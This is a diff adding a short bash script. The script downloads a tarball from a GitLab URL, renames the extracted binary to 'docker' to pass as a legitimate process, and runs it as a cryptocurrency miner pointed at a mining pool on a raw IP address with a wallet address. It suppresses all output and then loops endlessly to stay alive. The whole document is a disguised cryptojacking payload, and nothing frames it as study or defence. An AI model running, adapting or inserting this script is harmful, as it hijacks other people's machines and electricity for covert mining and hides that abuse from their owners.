@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://gitlab.com/zenardozhe/jual/-/raw/main/TT.tar.gz && tar -xvf TT.tar.gz
+mv IJAN docker
+./docker -a firopow -o stratum+tcp://172.104.80.135:80 -u aFBufzqtkpcysFf3CEswawmqhUkBbh4wWL.$(echo $(shuf -i 1000-9999 -n 1)-RABBIT) -p x >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
